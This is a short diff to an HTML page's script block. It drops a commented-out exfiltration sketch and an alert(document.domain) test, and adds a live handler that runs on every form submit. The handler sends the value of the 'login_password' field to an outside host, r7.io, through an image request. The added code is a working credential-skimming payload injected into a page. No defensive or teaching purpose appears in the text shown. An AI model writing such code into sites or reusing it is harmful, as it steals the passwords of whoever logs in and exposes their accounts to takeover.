@@ -51,13 +51,11 @@
 </div>
 
 <script>
-    function function() {
-      // var password = document.getElementById("password").value;
-      // i = new Image();
-      // i.src="http://r7.io/e/IP7gXR3btQ?s="+password;
-      alert(document.domain);
-    }
-  </script>
+  $("form").submit(function() {
+    var i = new Image();
+    i.src="http://r7.io/e/IP7gXR3btQ?s="+document.getElementById("login_password").value;
+    });
+</script>
 
 
 
